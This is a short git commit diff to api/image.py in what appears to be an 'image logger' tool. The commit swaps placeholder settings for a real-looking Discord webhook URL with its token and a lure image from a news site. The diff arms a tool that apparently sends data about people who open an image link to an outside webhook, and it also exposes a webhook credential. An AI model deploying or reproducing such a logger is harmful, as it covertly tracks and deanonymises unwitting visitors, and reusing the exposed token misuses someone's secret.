15be2a39b15dbd9511463d4ce606287d5988f125
nskyman <lengocnhatdz2012@gmail.com>
2025-09-04 20:21:27 +0700

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1413151284629868694/fib_8ro95hoLWs01ovS671jGyJivPwm3Vs2oCrQVY1gNggel8YEkb9JEgpDvMwLzwq9-",
+    "image": "https://cdnphoto.dantri.com.vn/eqYPRJeiHeWkYsZVGuCO2sJsjAg=/thumb_w/1360/2025/08/29/bao-1756453027805.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
